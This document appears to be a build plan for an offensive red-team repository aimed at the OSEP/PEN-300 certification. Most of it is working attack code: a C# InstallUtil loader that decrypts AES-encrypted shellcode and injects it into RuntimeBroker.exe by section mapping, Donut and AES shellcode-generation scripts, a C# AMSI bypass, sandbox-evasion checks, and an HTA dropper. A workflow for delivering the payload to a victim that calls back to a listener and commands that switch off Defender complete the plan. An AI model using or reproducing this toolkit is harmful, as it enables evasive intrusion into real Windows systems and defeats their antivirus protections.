Purpose: This document captures the analysis of osep-tools and provides a concrete build plan for adding modern, evasive tooling suitable for OSEP/PEN-300 engagements where Windows Defender is active.

Context: The existing repository uses well-known techniques that are now signatured. The primary goal is to add a PowerShell-free InstallUtil C# shellcode loader with modern evasion, plus supporting workflows for shellcode generation and delivery.

1. Current State of the Repository
What exists and works
word-macro/installutil-applocker-bypass/installutil.cs — InstallUtil AppLocker bypass that downloads and executes PowerShell (via IEX) for AMSI bypass + payload. PowerShell-dependent.

aes-loaders/aes-normal-runner/ — Standalone EXE, AES-encrypted shellcode, VirtualAlloc + CreateThread. Uses RWX.

aes-loaders/aes-process-injection/ — Standalone EXE, AES-encrypted shellcode, VirtualAllocEx + CreateRemoteThread into notepad.exe. Uses RWX, classic injection chain.

aes-loaders/aes-process-hollowing/ — Standalone EXE, AES-encrypted shellcode, process hollowing into svchost.exe. More advanced.

amsi-bypass/amsi-bypass.ps1 — PowerShell AMSI patch. Signatured.

hta-delivery/black.hta — bitsadmin + certutil + installutil.exe /U chain. LOLBin-heavy.

ps-loaders/ — PowerShell runners. Signatured AMSI/ETW patches, classic VirtualAlloc + CreateThread.

What's missing
InstallUtil payload that doesn't invoke PowerShell (no AMSI exposure)

Donut integration workflow

AES encryption inside the InstallUtil payload

RW→RX memory allocation (all current loaders use RWX)

Configurable injection target (notepad.exe is heavily monitored)

C#-native AMSI bypass (for any PowerShell post-exploitation)

Callback-based execution primitive

Detection-layer documentation

2. Build Priorities
Order	Component	Priority	Rationale
1	InstallUtil section-injection C# payload	🔴 Critical	Primary initial-access vector; no AMSI exposure
2	Donut integration workflow	🔴 Critical	Replaces signatured msfvenom shellcode
3	AES decryption inside InstallUtil payload	🟠 High	Second layer of signature evasion
4	RW→RX allocation	🟠 High	Kills biggest behavioral indicator
5	Configurable target process	🟡 Medium	Avoids notepad.exe monitoring
6	C#-native AMSI bypass	🟡 Medium	Needed if PowerShell post-exploitation is used
7	Callback-based execution	🟡 Medium	Backup if thread creation still flagged
8	Sandbox checks standardized	🟢 Low	Consistency across all loaders
9	Alternative HTA decode methods	🟢 Low	Circumvents LOLBin detection
10	Detection matrix documentation	🟡 Medium	Operational clarity
3. Target Repository Structure
text
osep-tools/
├── README.md
├── detection-matrix.md
├── installutil/
│   ├── section-injection/
│   │   ├── Loader.cs
│   │   ├── compile.bat
│   │   └── README.md
│   ├── callback-injection/
│   │   ├── Loader.cs
│   │   ├── compile.bat
│   │   └── README.md
│   └── runspace-loader/
│       ├── Loader.cs
│       ├── compile.bat
│       └── README.md
├── shellcode-gen/
│   ├── donut-wrapper.ps1
│   ├── byte-array-converter.ps1
│   └── aes-encrypt-shellcode.ps1
├── hta-delivery/
│   ├── certutil-method/
│   │   └── loader.hta
│   └── self-decode-method/
│       └── loader.hta
└── aes-loaders/
    └── (existing, unchanged)
4. Component 1 — InstallUtil Section-Injection Loader
File: installutil/section-injection/Loader.cs

Purpose: A C# DLL/EXE executed via InstallUtil.exe /U that:

Performs sandbox checks

Decrypts AES-encrypted shellcode in memory

Injects via section mapping (NtCreateSection + NtMapViewOfSection)

Uses RW→RX protection transitions

Targets a configurable process (default: RuntimeBroker.exe)

Architecture
text
Uninstall(savedState)
  ├─ Sandbox checks
  │   ├─ FlsAlloc(IntPtr.Zero) == 0xFFFFFFFF → exit
  │   └─ Sleep(2000) timing check → exit
  │
  ├─ AES decrypt embedded shellcode
  │   ├─ Aes.Create() with hardcoded Key + IV
  │   └─ TransformFinalBlock(ciphertext) → plaintext shellcode
  │
  ├─ Locate target process
  │   ├─ Process.GetProcessesByName(targetName)
  │   └─ OpenProcess(0x001F0FFF, false, pid)
  │
  ├─ Section injection
  │   ├─ NtCreateSection(SECTION_ALL_ACCESS, PAGE_READWRITE, SEC_COMMIT)
  │   ├─ NtMapViewOfSection(local, PAGE_READWRITE) → ba1
  │   ├─ Marshal.Copy(shellcode, ba1)
  │   ├─ NtMapViewOfSection(target, PAGE_READONLY) → ba2
  │   ├─ NtUnmapViewOfSection(local, ba1)
  │   └─ NtProtectVirtualMemory(target, ba2, PAGE_EXECUTE_READ)
  │
  └─ Execute
      └─ CreateRemoteThread(target, ba2)
         (or callback primitive — see Component 7)
Key implementation notes
Do not use RWX anywhere. Section creation uses PAGE_READWRITE (0x04). Only after the local view is unmapped and the remote view exists should NtProtectVirtualMemory flip to PAGE_EXECUTE_READ (0x20).

AES Key and IV: embed as byte arrays. Generate them with Component 3.

byte[] buf should hold ciphertext, not plaintext. Decrypt inside Uninstall().

Target process: load from a hardcoded string or env var. Default to RuntimeBroker.exe.

Skeleton
csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Configuration.Install;

namespace Loader
{
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError=true)] static extern UInt32 FlsAlloc(IntPtr lpCallback);
        [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
        [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtCreateSection(ref IntPtr h, uint access, IntPtr attr, ref ulong size, uint prot, uint alloc, IntPtr file);
        [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtMapViewOfSection(IntPtr h, IntPtr proc, ref IntPtr baseAddr, UIntPtr zero, UIntPtr commit, out ulong offset, out uint viewSize, uint inherit, uint allocType, uint prot);
        [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtUnmapViewOfSection(IntPtr proc, IntPtr baseAddr);
        [DllImport("ntdll.dll")] static extern uint NtClose(IntPtr h);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr tid);

        // Generated by aes-encrypt-shellcode.ps1 (Component 3)
        private static readonly byte[] AesKey = new byte[32] { /* 32 bytes */ };
        private static readonly byte[] AesIV  = new byte[16] { /* 16 bytes */ };
        private static readonly byte[] EncryptedShellcode = new byte[] { /* ciphertext */ };

        private static readonly string TargetProcessName = "RuntimeBroker";

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // 1. Sandbox checks
            if (FlsAlloc(IntPtr.Zero) == 0xFFFFFFFF) return;
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

            // 2. AES decrypt
            byte[] shellcode;
            using (Aes aes = Aes.Create())
            {
                aes.Key = AesKey;
                aes.IV = AesIV;
                using (var dec = aes.CreateDecryptor())
                    shellcode = dec.TransformFinalBlock(EncryptedShellcode, 0, EncryptedShellcode.Length);
            }

            // 3. Target process
            var procs = Process.GetProcessesByName(TargetProcessName);
            if (procs.Length == 0) return;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, procs[0].Id);

            // 4. Section injection with RW -> RX
            IntPtr hSection = IntPtr.Zero;
            IntPtr localView = IntPtr.Zero;
            IntPtr remoteView = IntPtr.Zero;
            ulong size = (ulong)shellcode.Length;
            uint viewSize = 0;
            ulong offset = 0;

            NtCreateSection(ref hSection, 0xF001F, IntPtr.Zero, ref size, 0x04 /*RW*/, 0x8000000, IntPtr.Zero);
            NtMapViewOfSection(hSection, GetCurrentProcess(), ref localView, UIntPtr.Zero, UIntPtr.Zero, out offset, out viewSize, 1, 0, 0x04 /*RW*/);
            NtMapViewOfSection(hSection, hProcess,        ref remoteView, UIntPtr.Zero, UIntPtr.Zero, out offset, out viewSize, 1, 0, 0x04 /*RW*/);

            Marshal.Copy(shellcode, 0, localView, shellcode.Length);

            NtUnmapViewOfSection(GetCurrentProcess(), localView);
            NtClose(hSection);

            // 5. Flip remote view to RX (implement NtProtectVirtualMemory)
            // ... see Component 4 for the RW->RX helper ...

            // 6. Execute
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteView, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
Compile command
text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
  /target:exe ^
  /platform:x64 ^
  /optimize+ ^
  /out:loader.exe ^
  /reference:System.Configuration.Install.dll ^
  Loader.cs
5. Component 2 — Donut Integration Workflow
File: shellcode-gen/donut-wrapper.ps1

Purpose: Wrap Donut invocation and produce a C# byte array ready to paste into Component 1.

Script
powershell
<#
.SYNOPSIS
  Generates Donut shellcode from a PE/.NET assembly and outputs a C# byte array.
.EXAMPLE
  .\donut-wrapper.ps1 -InputFile meterpreter.exe -OutputFile shellcode.cs -Arch x64
#>
param(
    [Parameter(Mandatory=$true)][string]$InputFile,
    [Parameter(Mandatory=$true)][string]$OutputFile,
    [ValidateSet("x86","x64","both")][string]$Arch = "x64",
    [string]$DonutPath = ".\donut.exe",
    [switch]$SkipCompression,
    [switch]$SkipEncryption
)

$archFlag = switch ($Arch) { "x86" { 1 } "x64" { 2 } "both" { 3 } }
$compFlag = if ($SkipCompression) { 1 } else { 2 }   # 2 = aPLib (cross-platform)
$encFlag  = if ($SkipEncryption)  { 1 } else { 3 }   # 3 = random names + Chaskey

$binFile = [IO.Path]::GetTempFileName() + ".bin"

& $DonutPath -i $InputFile -a $archFlag -f 1 -z $compFlag -e $encFlag -o $binFile

if (-not (Test-Path $binFile)) { throw "Donut failed to produce output" }

$bytes = [IO.File]::ReadAllBytes($binFile)
$hex = ($bytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","

@"
// Generated by donut-wrapper.ps1
// Source: $InputFile
// Size: $($bytes.Length) bytes
private static readonly byte[] Shellcode = new byte[$($bytes.Length)] {
$hex
};
"@ | Set-Content -Path $OutputFile -Encoding ASCII

Remove-Item $binFile -Force
Write-Host "[+] Wrote $($bytes.Length) bytes to $OutputFile"
6. Component 3 — AES Encryption + C# Key/IV Output
File: shellcode-gen/aes-encrypt-shellcode.ps1

Purpose: Take raw shellcode (from Donut or msfvenom) and produce:

The ciphertext as a C# byte array

The AES Key and IV as C# byte arrays

Script
powershell
<#
.SYNOPSIS
  Encrypts raw shellcode with AES-256-CBC and outputs C# byte arrays for Key, IV, and ciphertext.
.EXAMPLE
  .\aes-encrypt-shellcode.ps1 -InputFile shellcode.bin -OutputFile aes_data.cs
#>
param(
    [Parameter(Mandatory=$true)][string]$InputFile,
    [Parameter(Mandatory=$true)][string]$OutputFile
)

$plaintext = [IO.File]::ReadAllBytes($InputFile)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.GenerateKey()
$aes.GenerateIV()

$encryptor = $aes.CreateEncryptor()
$ciphertext = $encryptor.TransformFinalBlock($plaintext, 0, $plaintext.Length)

function Format-ByteArray($bytes, $name, $type = "byte") {
    $hex = ($bytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
    "private static readonly $type[] $name = new $type[$($bytes.Length)] { $hex };"
}

$out = @()
$out += "// Generated by aes-encrypt-shellcode.ps1"
$out += "// Plaintext size: $($plaintext.Length) bytes"
$out += "// Ciphertext size: $($ciphertext.Length) bytes"
$out += ""
$out += Format-ByteArray $aes.Key        "AesKey"
$out += Format-ByteArray $aes.IV         "AesIV"
$out += Format-ByteArray $ciphertext     "EncryptedShellcode"

$out -join "`n" | Set-Content -Path $OutputFile -Encoding ASCII
Write-Host "[+] Wrote AES data to $OutputFile"
Write-Host "[!] Save the key/IV securely — they are required for decryption"
7. Component 4 — RW→RX Memory Protection Helper
File: installutil/section-injection/RW-RX-Helper.cs (or inline in Loader.cs)

Purpose: Provide NtProtectVirtualMemory wrapper to flip a memory region from RW to RX.

Skeleton
csharp
[DllImport("ntdll.dll", SetLastError=true)]
static extern uint NtProtectVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref UIntPtr regionSize,
    uint newProtect,
    out uint oldProtect);

const uint PAGE_EXECUTE_READ = 0x20;

static bool FlipToRX(IntPtr hProcess, IntPtr baseAddr, uint size)
{
    IntPtr addr = baseAddr;
    UIntPtr sz = (UIntPtr)size;
    uint oldProt;
    uint status = NtProtectVirtualMemory(hProcess, ref addr, ref sz, PAGE_EXECUTE_READ, out oldProt);
    return status == 0;
}
Where to call: After the remote view is populated with shellcode but before CreateRemoteThread.

8. Component 5 — Configurable Target Process
Replace hardcoded "notepad" with:

csharp
private static readonly string TargetProcessName =
    Environment.GetEnvironmentVariable("INJ_TARGET") ?? "RuntimeBroker";
Alternative default targets (ranked by how monitored they are):

Process	Notes
RuntimeBroker.exe	Runs per-user, less monitored, always present
dllhost.exe	COM surrogate, always present, less monitored
svchost.exe	Highly monitored, but common in malware
SearchIndexer.exe	Low-traffic, less monitored
notepad.exe	Very heavily monitored — avoid
explorer.exe	Highly monitored
9. Component 6 — C#-Native AMSI Bypass
File: installutil/runspace-loader/AmsiBypass.cs

Purpose: For any payload that needs PowerShell (e.g., a runspace loader), disable AMSI from C# before creating the runspace. No downloaded amsi.txt needed.

AmsiOpenSession Context Corruption
csharp
using System;
using System.Reflection;
using System.Runtime.InteropServices;

public static class AmsiBypass
{
    public static bool Disable()
    {
        try
        {
            // Force AMSI to initialize
            var psType = Type.GetType("System.Management.Automation.PSObject, System.Management.Automation");
            if (psType == null) return false;

            var amsiType = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
            if (amsiType == null) return false;

            var ctxField = amsiType.GetField("amsiContext", BindingFlags.NonPublic | BindingFlags.Static);
            if (ctxField == null) return false;

            IntPtr ctx = (IntPtr)ctxField.GetValue(null);
            if (ctx == IntPtr.Zero) return false;

            // Zero 8 bytes at offset 0x8
            IntPtr target = IntPtr.Add(ctx, 0x8);
            Marshal.WriteInt64(target, 0);

            return true;
        }
        catch { return false; }
    }
}
Usage in a runspace loader:

csharp
public override void Uninstall(System.Collections.IDictionary savedState)
{
    AmsiBypass.Disable();
    Runspace rs = RunspaceFactory.CreateRunspace();
    rs.Open();
    PowerShell ps = PowerShell.Create();
    ps.Runspace = rs;
    ps.AddScript("...");
    ps.Invoke();
    rs.Close();
}
Note: This is signatured as a technique, but the C# implementation avoids the PowerShell text signature that amsi.txt triggers. Combine with Invoke-Obfuscation if the C# assembly itself gets flagged.

10. Component 7 — Callback-Based Execution Primitive
File: installutil/callback-injection/Loader.cs

Purpose: Replace CreateRemoteThread with a callback execution via CallWindowProc or EnumWindows. Use only if CreateRemoteThread is being flagged behaviorally.

Skeleton using CallWindowProc
csharp
[DllImport("user32.dll", SetLastError=true)]
static extern IntPtr CallWindowProc(
    IntPtr lpPrevWndFunc,
    IntPtr hWnd,
    uint Msg,
    IntPtr wParam,
    IntPtr lParam);
The remote process must already have the shellcode in executable memory. Then invoke:

csharp
CallWindowProc(shellcodeAddress, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
Note: For a remote process, you need the shellcode address in the target's address space, which is what the section-mapping step gives you (remoteView).

For remote callback execution, EnumWindows in the target process won't work directly — you'd need a different technique (thread hijacking, QueueUserAPC, etc.). See AlternativeShellcodeExec on GitHub for a full list of primitives.

11. Component 8 — Sandbox Checks (Standardized)
Add these to every loader:

csharp
[DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
[DllImport("kernel32.dll", SetLastError=true)] static extern UInt32 FlsAlloc(IntPtr lpCallback);
[DllImport("kernel32.dll")] static extern int GetTickCount();

static bool IsSandbox()
{
    // 1. Fiber Local Storage check
    if (FlsAlloc(IntPtr.Zero) == 0xFFFFFFFF) return true;

    // 2. Timing check
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return true;

    // 3. Tick count consistency
    int tc1 = GetTickCount();
    Sleep(500);
    int tc2 = GetTickCount();
    if ((tc2 - tc1) < 450) return true;

    // 4. CPU count
    if (Environment.ProcessorCount < 2) return true;

    // 5. RAM
    if (new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory < 2_000_000_000) return true;

    return false;
}
Call if (IsSandbox()) return; at the top of Uninstall().

12. Component 9 — Alternative HTA Decode Methods
File: hta-delivery/self-decode-method/loader.hta

Purpose: Avoid bitsadmin and certutil (both heavily monitored LOLBins).

Alternative 1: Embed payload directly in the HTA
html
<html>
<head>
<script language="VBScript">
  ' Base64 payload embedded directly
  Dim b64 : b64 = "TVqQAAMAAAAEAAAA..."
  Dim bytes : bytes = DecodeBase64(b64)

  ' Write to %TEMP%
  Dim fso, tmpPath
  Set fso = CreateObject("Scripting.FileSystemObject")
  tmpPath = fso.GetSpecialFolder(2) & "\svc.exe"
  WriteBinary tmpPath, bytes

  ' Execute via InstallUtil
  CreateObject("WScript.Shell").Run "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U " & tmpPath, 0, False

  Function DecodeBase64(s)
    Dim xml : Set xml = CreateObject("MSXML2.DOMDocument")
    Dim el : Set el = xml.createElement("b")
    el.dataType = "bin.base64"
    el.text = s
    DecodeBase64 = el.nodeTypedValue
  End Function

  Sub WriteBinary(path, data)
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write data
    stream.SaveToFile path, 2
    stream.Close
  End Sub
</script>
</head>
<body>Loading...</body>
</html>
Alternative 2: Use PowerShell's [Convert]::FromBase64String via mshta if PS is allowed
Less stealthy but works if PS is unblocked.

Alternative 3: Use expand.exe
expand.exe can decompress CAB files; less monitored than certutil but limited.

13. Component 10 — Detection Matrix Documentation
File: detection-matrix.md

Purpose: Map each tool to the detection layer it addresses.

markdown
# Detection Matrix

| Tool | AMSI | Signature | Behavioral | Memory | Network |
|------|------|-----------|------------|--------|---------|
| installutil/section-injection | ❌ | ✅ (AES) | ⚠️ Section chain | ✅ (RW→RX) | ❌ |
| installutil/callback-injection | ❌ | ✅ (AES) | ✅ (no CreateThread) | ✅ (RW→RX) | ❌ |
| installutil/runspace-loader | ✅ (C# bypass) | ⚠️ | ⚠️ | N/A | ⚠️ |
| aes-loaders/aes-process-injection | ❌ | ⚠️ | ❌ (RWX) | ⚠️ | ❌ |
| ps-loaders/* | ❌ | ❌ | ❌ | ❌ | ❌ |

Legend:
✅ Addressed
⚠️ Partial
❌ Not addressed
N/A Not applicable
14. End-to-End Workflow
Step 1: Generate and encrypt shellcode
powershell
# 1a. Convert a PE/.NET assembly to shellcode with Donut
.\donut-wrapper.ps1 -InputFile meterpreter.exe -OutputFile shellcode.cs -Arch x64

# 1b. Extract the byte array from shellcode.cs, save as shellcode.bin
#     (or modify donut-wrapper.ps1 to also write the .bin)

# 1c. AES-encrypt it and produce C# arrays
.\aes-encrypt-shellcode.ps1 -InputFile shellcode.bin -OutputFile aes_data.cs
Step 2: Build the loader
powershell
# 2a. Copy the AesKey, AesIV, and EncryptedShellcode arrays from aes_data.cs
#     into Loader.cs (replacing the placeholder arrays)

# 2b. Compile
cd installutil\section-injection
.\compile.bat
Step 3: Encode and deliver
powershell
# 3a. Base64-encode the compiled loader
certutil -encode loader.exe loader.b64
# (or use PowerShell: [Convert]::ToBase64String([IO.File]::ReadAllBytes("loader.exe")) | Set-Content loader.b64)

# 3b. Embed loader.b64 in the HTA (self-decode method) or host it on your server

# 3c. Deliver the HTA to the victim
Step 4: Execute on the victim
The HTA:

Decodes the embedded Base64 to %TEMP%\svc.exe

Runs InstallUtil.exe /U %TEMP%\svc.exe

Loader runs Uninstall(), passes sandbox checks, decrypts shellcode, injects into RuntimeBroker.exe, and executes via section mapping with RW→RX

Shellcode connects back to your listener

15. Testing Methodology
Test each layer in isolation using Defender's protection toggles.

Enable only one protection layer at a time
powershell
# Disable everything
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
Test 1: Static / signature detection
Enable only DisableScriptScanning = $false + DisableIOAVProtection = $false.

If caught: signature detection → strengthen Donut encryption / obfuscation.

Test 2: Behavioral detection
Enable only DisableBehaviorMonitoring = $false.

If caught: behavioral → verify RW→RX, consider callback primitive.

Test 3: Memory scanning
Enable DisableRealtimeMonitoring = $false.

If caught: memory scanner → verify shellcode is Donut-generated and not signatured after decrypt.

Test 4: Full protection
Enable everything. If caught, cross-reference Get-MpThreatDetection event IDs:

1116 → signature

1006 / 1015 → behavioral

Diagnostic commands
powershell
# Check what fired
Get-MpThreatDetection | Select-Object InitialDetectionTime, ThreatName, @{N='Path';E={$_.Resources}}, ActionSuccess

# Watch live
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116,1117,1006,1015} -MaxEvents 20 | Format-List TimeCreated, Id, Message
16. Reference: Donut Flags
Flag	Meaning	Values
-i	Input file	PE / .NET / VBS / JS / XSL
-a	Architecture	1 = x86, 2 = x64, 3 = both
-f	Output format	1 = binary, 2 = Base64, 6 = PowerShell
-z	Compression	1 = none, 2 = aPLib (cross-platform), 3 = LZNT1 (Win), 4 = Xpress (Win), 5 = Xpress Huffman (Win)
-e	Entropy	1 = none, 2 = random names, 3 = random names + Chaskey encryption
-o	Output file	path
For OSEP: Always use -a 2 -f 1 -z 2 -e 3. -z 2 works on all platforms; -e 3 encrypts so static signatures don't match.

17. Reference: InstallUtil Execution
Compile as DLL (InstallUtil-native)
text
csc.exe /target:library /platform:x64 /out:loader.dll /reference:System.Configuration.Install.dll Loader.cs
Compile as EXE (still InstallUtil-compatible)
text
csc.exe /target:exe /platform:x64 /out:loader.exe /reference:System.Configuration.Install.dll Loader.cs
Execute
text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U C:\path\to\loader.exe
Requirements for InstallUtil to invoke Uninstall():

Class must inherit System.Configuration.Install.Installer

Class must have [System.ComponentModel.RunInstaller(true)]

Method signature: public override void Uninstall(System.Collections.IDictionary savedState)

Must be .NET Framework (not .NET Core / .NET 5+)

/U flag triggers Uninstall; default triggers Install

18. Build Order Checklist
□ Day 1: Create repository structure; write compile.bat and skeleton Loader.cs
□ Day 1: Implement Component 3 (aes-encrypt-shellcode.ps1)
□ Day 2: Implement Component 2 (donut-wrapper.ps1)
□ Day 2: Finish Component 1 (Loader.cs with section injection + AES decrypt)
□ Day 3: Implement Component 4 (RW→RX helper); integrate into Loader
□ Day 3: Test end-to-end in lab VM with Defender disabled
□ Day 4: Test with Defender enabled; iterate on detection layer
□ Day 5: Implement Component 7 (callback primitive) if needed
□ Day 5: Implement Component 8 (sandbox checks)
□ Day 6: Implement Component 9 (self-decode HTA)
□ Day 7: Write detection-matrix.md and README files
□ Day 7: Full end-to-end test in clean lab VM
19. Known Issues / Risks
Risk	Mitigation
Donut output becomes signatured	Try -e 3 with different compression; consider custom stager
InstallUtil.exe itself blocked by Application Control	Add fallback: MSBuild.exe, RegAsm.exe, or RegSvcs.exe
RuntimeBroker.exe not running as expected user	Enumerate running processes first; pick the first available target
AES Key/IV embedded in the assembly are extractable	Acceptable risk for OSEP; not a concern for a short-lived payload
Section-based injection still flagged	Switch to callback primitive (Component 7)
Memory scanner catches shellcode after decryption	Donut's -e 3 stub runs its own decryption; ensure the final decrypted bytes don't match a signature
20. What to Leave Alone in the Existing Repository
aes-loaders/ — leave as reference; don't modify

uac-bypass/ — leave as-is (still works)

word-macro/ — leave as reference; the new installutil/section-injection supersedes word-macro/installutil-applocker-bypass/installutil.cs for the PowerShell-free case

ps-loaders/ — leave as-is; deprecated but useful for lab reference

The new components live alongside the existing structure without overwriting anything.

End of handoff. Start with Component 1 and Component 3. Everything else builds on top.